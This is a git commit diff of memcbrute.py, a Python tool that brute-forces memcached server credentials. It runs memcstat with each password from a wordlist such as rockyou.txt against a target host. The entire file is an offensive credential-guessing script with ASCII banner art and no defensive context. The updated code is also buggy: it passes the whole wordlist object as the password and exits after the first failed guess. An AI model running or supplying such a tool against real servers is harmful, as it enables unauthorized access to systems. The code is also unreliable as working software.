cc068d1085dee56bba4ee1eac4c57c4977fe061d
Kr0ff <Kr0ff@Kr0ffs-MacBook-Air.local>
2020-01-29 20:43:56 +0000

    Update memcbrute.py

--- memcbrute.py
+++ memcbrute.py
@@ -1,17 +1,52 @@
 #!/usr/bin/env python3
 
-import subprocess as s
+import subprocess
+import sys
+from time import sleep
+from termcolor import colored
 
-print ("""
-|\/| _ _  _|_  _   |_ _
-|  |(-|||(_|_)| |_||_(-
+art = ("""
+
+@@@@@@@@@@  @@@@@@@@ @@@@@@@@@@   @@@@@@@ @@@@@@@  @@@@@@@  @@@  @@@ @@@@@@@ @@@@@@@@
+ @@! @@! @@! @@!      @@! @@! @@! !@@      @@!  @@@ @@!  @@@ @@!  @@@   @@!   @@!
+ @!! !!@ @!@ @!!!:!   @!! !!@ @!@ !@!      @!@!@!@  @!@!!@!  @!@  !@!   @!!   @!!!:!
+ !!:     !!: !!:      !!:     !!: :!!      !!:  !!! !!: :!!  !!:  !!!   !!:   !!:
+  :      :   : :: :::  :      :    :: :: : :: : ::   :   : :  :.:: :     :    : :: :::
+
 """)
 
-w = open('/usr/share/wordlists/rockyou.txt')
+usage = ("Usage: ./memcbrute.py <username> <target> <wordlist>")
 
-for p in w:
-        o = s.getoutput("memcstat --username=user --servers=192.160.226.3 --password="+p) #Change: IP, Username
-        if len(o) > 0:
-                #print(o) #Enable if you want to see the output of the command		
-                print('Password is:' + p)
+def bruteforce(user, target, wordlist):
+    try:
+        for passwd in wordlist:
+            cmd = subprocess.getoutput("/bin/memcstat --username={} --servers={} --password={}".format(user, target, wordlist))
+            if len(cmd) > 0:
+                #print(cmd) #Enable if you want to see the output of the command
+                print(colored('[+] Password found: {}'.format(passwd), "green"))
                 break
+
+            else:
+                print(colored("[-] Password was not found !","red"))
+                sleep(1.5)
+                print(colored("[*] Maybe use a different wordlist...?","yellow"))
+                sys.exit(0)
+
+    except KeyboardInterrupt:
+        print(colored("[!] CTRL + C detected, exiting..."))
+        sleep(0.8)
+        sys.exit(0)
+
+if __name__ == "__main__":
+    try:
+        user = sys.argv[1]
+        target = sys.argv[2]
+        wordlist = open(sys.argv[3], 'r')
+
+        print(art)
+        bruteforce(user, target, wordlist)
+
+    except IndexError:
+        print(art)
+        print(colored("[-] No arguments provided !","red"))
+        print(usage)
